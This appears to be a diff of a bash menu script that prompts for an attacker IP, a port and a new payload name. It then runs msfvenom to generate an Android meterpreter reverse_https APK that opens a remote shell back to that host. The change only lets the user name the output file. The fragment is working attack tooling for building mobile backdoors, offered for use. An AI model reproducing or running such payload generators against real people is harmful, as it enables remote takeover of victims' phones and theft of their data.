@@ -86,8 +86,9 @@ case $opt in
 			1)
 				read -p "Enter Your IP Address >" ip
 				read -p "Enter Your Local Port No. >" p
+				read -p "Enter Your Payload Name >" N
 			   echo "Have Patience while Creating Payload..........."
-				gnome-terminal -- msfvenom -p android/meterpreter/reverse_https lhost=$ip LPORT=$p R> /root/Desktop/Payload.apk
+				gnome-terminal -- msfvenom -p android/meterpreter/reverse_https lhost=$ip LPORT=$p R> /root/Desktop/$N.apk
 				sleep 10
 				echo "Payload is been created Successfully"
 				sleep 10
